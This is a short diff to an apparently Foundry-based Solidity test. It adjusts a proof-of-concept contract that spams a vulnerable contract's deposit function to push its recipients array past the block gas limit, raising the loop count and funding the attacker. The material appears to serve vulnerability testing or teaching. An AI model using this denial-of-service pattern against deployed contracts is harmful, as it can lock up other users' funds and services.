@@ -13,7 +13,7 @@ contract AttackContract {
 
     function attack() external {
         // Spam the recipients array to exceed block gas limit
-        for (uint256 i = 0; i < 1000; i++) {
+        for (uint256 i = 0; i < 10000; i++) {
             target.deposit{value: 1 wei}();
         }
     }
@@ -30,6 +30,7 @@ contract DosBLockGasLimit is Test {
         vm.deal(attackerAddress, 50000 ether);
         vm.startPrank(attackerAddress);
         attacker = new AttackContract(address(vulnerable));
+        vm.deal(address(attacker), 5000 ether);
         vm.stopPrank();
 
         // Load 10 recipients
